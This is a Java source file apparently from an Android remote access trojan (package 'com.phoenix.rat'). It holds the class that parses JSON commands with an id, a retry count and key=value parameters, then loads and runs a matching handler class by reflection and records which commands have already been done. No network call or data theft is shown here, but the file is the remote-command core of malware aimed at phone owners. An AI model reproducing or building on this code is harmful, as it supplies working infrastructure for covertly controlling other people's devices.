package com.phoenix.rat.helper;

import android.content.Context;

import com.phoenix.rat.confs.Config;
import com.phoenix.rat.interfaces.CommandInterface;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by mphj on 7/17/17.
 */
public class Command {
    private String command;
    private Map<String, String> params = new HashMap<>();
    private int maxAttemp;
    private int id;

    public void setId(int id){
        this.id = id;
    }

    public int getId(){
        return id;
    }

    public int getMaxAttemp(){
        return maxAttemp;
    }

    public void setMaxAttemp(int maxAttemp){
        this.maxAttemp = maxAttemp;
    }

    public String getCommand(){
        return command;
    }

    public void setCommand(String command){
        this.command = command;
    }

    public void addParam(String param, String value){
        params.put(param, value);
    }

    public String getParam(String param){
        return params.get(param);
    }

    public static Command fromJson(JSONObject jsonObject) throws Exception{
        int id = jsonObject.getInt("id");
        int maxAttemp = jsonObject.getInt("attemp");
        Command command = parseCommand(jsonObject.getString("command"));
        command.setId(id);
        command.setMaxAttemp(maxAttemp);
        return command;
    }

    public static Command parseCommand(String commandString){
        Command command = new Command();
        String[] arr = commandString.split(" ");
        command.setCommand(arr[0]);
        for (int i = 1; i < arr.length; i++){
            String[] params = arr[i].split("=");
            command.addParam(params[0], params[1]);
        }
        return command;
    }


    public void invoke(Context context) throws Exception{
        Class<? extends CommandInterface> classInstance = (Class<? extends CommandInterface>) Class.forName(Config.COMMAND_PACKAGE + "." + getCommand());
        CommandInterface commandInterface = classInstance.getDeclaredConstructor(Command.class).newInstance(this);
        commandInterface.execute(context);
    }


    public boolean isValid(Context context){
        return !new TinyDB(context).getBoolean(String.valueOf(getId()));
    }


}
